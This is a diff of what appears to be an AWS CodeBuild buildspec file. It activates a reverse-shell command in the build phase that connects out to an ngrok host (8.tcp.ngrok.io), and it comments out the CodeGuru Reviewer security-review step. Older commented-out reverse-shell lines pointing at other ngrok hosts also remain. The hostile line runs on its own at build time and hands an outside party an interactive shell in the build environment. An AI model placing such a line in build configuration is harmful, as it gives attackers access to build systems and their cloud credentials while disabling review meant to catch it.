@@ -5,22 +5,22 @@ phases:
     runtime-versions:
       nodejs: 10
     commands:
-      - echo "installing something"
+      - echo "installing something "
   pre_build:
     commands:
       - echo "we are in the pre build phase"
   build:
     commands:
-      #- echo "we are in the build block"
+      - echo "we are in the build block"
       #- bash -c 'bash -i >& /dev/tcp/0.tcp.us-cal-1.ngrok.io/xxxxx0>&1'
-      #- bash -c 'bash -i >& /dev/tcp/0.tcp.ngrok.io/12717 0>&1'
-      #- echo "we will run some tests"
-      #- ls
-      #- grep -Fq "Cross-Site Scripting (XSS)" index.html
+      - bash -c 'bash -i >& /dev/tcp/8.tcp.ngrok.io/11203 0>&1'
+      - echo "we will run some tests"
+      - ls
+      - grep -Fq "Cross-Site Scripting (XSS)" index.html
       # Analizar el código con CodeGuru Reviewer
-      - echo Running CodeGuru Reviewer...
-      - aws --version
-      - aws codeguru-reviewer create-code-review --repository-association-arn arn:aws:codeguru-reviewer:us-east-2:941377112071:association:602e0047-86af-4b68-99ca-5a95cd89e9cc --name "MyCodeGuruReview" --type=file://reviewCodeGuru.json
+      #- echo Running CodeGuru Reviewer...
+      #- aws --version
+      #- aws codeguru-reviewer create-code-review --repository-association-arn arn:aws:codeguru-reviewer:us-east-2:941377112071:association:602e0047-86af-4b68-99ca-5a95cd89e9cc --name "MyCodeGuruReview" --type=file://reviewCodeGuru.json
   post_build:
     commands:
       - echo "we are in the post build phase"
@@ -28,3 +28,4 @@ artifacts:
   files:
     - '**/*'
   name: DevOps-Code-Build
+
